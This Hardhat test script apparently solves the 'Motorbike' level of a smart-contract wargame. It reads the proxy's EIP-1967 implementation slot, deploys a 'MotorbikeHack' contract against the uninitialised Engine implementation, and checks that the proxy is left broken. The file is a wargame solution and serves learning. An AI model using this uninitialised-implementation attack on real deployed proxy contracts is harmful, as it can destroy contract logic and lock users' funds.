import { ethers } from 'hardhat';
import { impersonateAndInjectEther } from './utils';
import { expect } from 'chai';

describe('Motorbike', function () {
  it('attack', async function () {
    const target = '0xEB54eEd8321d4A9875F848Ac9272F4e590ff331b';
    const address = '0x07b05D3A1ed958944033060d058b8F0771ad1A6e';
    const sender = await impersonateAndInjectEther(address);

    // Get target contract
    const motorbike = await ethers.getContractAt('Engine', target);
    const slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
    const engineAddr = '0x' + (await ethers.provider.getStorageAt(motorbike.address, slot)).slice(26, 66);
    console.log('engineAddr', engineAddr);
    const engine = await ethers.getContractAt('Engine', engineAddr);

    // Deploy hack contract
    const MotorbikeHack = await ethers.getContractFactory('MotorbikeHack');
    const hack = await MotorbikeHack.deploy();
    await hack.connect(sender).deployed();

    // Attack
    await hack.attack(engine.address);

    await expect(motorbike.horsePower()).to.be.reverted;
  });
});
